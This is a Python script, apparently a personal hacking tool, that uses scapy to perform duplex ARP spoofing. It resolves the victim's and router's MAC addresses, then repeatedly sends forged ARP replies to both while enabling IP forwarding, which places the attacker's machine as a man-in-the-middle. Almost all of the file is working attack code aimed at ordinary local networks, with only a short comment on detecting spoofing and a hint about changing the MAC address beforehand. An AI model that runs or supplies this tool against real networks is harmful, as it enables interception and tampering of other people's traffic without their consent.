'''
    author  : zerobits01
    created : 29-Jan-2020
    modified:
    purpose : duplex arp spoofing attack
'''
import argparse
import scapy.all as scapy
import subprocess
import re
import time


parser = argparse.ArgumentParser(description='''
    author : zerobits01
    team   : Paradox-Squad
    gmail  : zerobist01@gmail.com
    description : just give ip of the victim and then your box
        will be MITM(duplex no need to do both router and victim manually)
''',formatter_class=argparse.RawTextHelpFormatter)

parser.add_argument('-i','--interface',type=str,
                    help='NIC that you want to choose',required=True)
parser.add_argument('--ip',required=True,help='victim ip',dest='victim')
args = parser.parse_args()

def getMac(ip):
    # getting mac-addr of an entered ip
    try :
        arp_packet = scapy.ARP(pdst=ip)  # this sends to IP[s]
        return scapy.sr(arp_packet, timeout=2, verbose=False)[0][0][1].hwsrc
    except Exception :
        print('[-] unexpected error occurred during getting mac!?!')
        exit(1)

# finding routerip
def findRouterIP():
    try :
        route_res = subprocess.check_output(['route -n'], shell=True)
        route_res = route_res.decode('utf-8')
        router_ip = re.search(r'(?:\d+\.\d+\.\d+\.\d+)\s*(?P<router>\d+\.\d+\.\d+\.\d+)',
                              route_res).group('router')
        return router_ip
    except Exception :
        print('[-] unexpected error occurred during getting router ip!?!')
        exit(1)

# getting the IPs
victim_ip  = args.victim
print(f'victim ip : {victim_ip}')
router_ip  = findRouterIP()
print(f'router ip : {router_ip}')
# getting Mac-Addr
victim_mac = getMac(victim_ip)
print(f'victim mac : {victim_mac}')
router_mac = getMac(router_ip)
print(f'victim mac : {router_mac}')


# TODO : sending through specific NIC
# TODO : ipforward enable
def spoofer(router_ip, router_mac, victim_ip, victim_mac):
    # in scapy op 1 means request and op 2 means response
    # we don't change the source mac because we wanna be MITM
    try :
        victim_arp_response = scapy.ARP(op=2, pdst=victim_ip, hwdst=victim_mac,
                                 psrc=router_ip)
        scapy.send(victim_arp_response, verbose=False)
        victim_arp_response = scapy.ARP(op=2, pdst=router_ip, hwdst=router_mac,
                                        psrc=victim_ip)
        scapy.send(victim_arp_response, verbose=False)
    except Exception :
        print('[-] unexpected error occurred during sending packets!?! ')
        exit(1)

'''
    for detecting arp spoof we can write an script that runs
    > arp -a
    and checking the response and if two mac-addrs has same IP
    we can say spoofing has been occurred
'''
counter = 0
try :
    while True:
        ipforward = 'echo 1 > /proc/sys/net/ipv4/ip_forward'
        exitcode = subprocess.call(ipforward)
        if exitcode != 0 :
            print('[-] ipforward can\'t be enabled!!')
        spoofer(router_ip,router_mac,victim_ip,victim_mac)
        string = '.' if counter == 0 else '..' if counter == 1 else '...'
        print('\b\r[*] sending packets' + string + '  ', end='')
        counter = counter + 1 if counter <= 2 else 0
        time.sleep(1)
        # we can use sys.stdout.flush() to clear the screen

except KeyboardInterrupt :
    print('[~] Quiting the app...')

# before doing this we can change our mac-address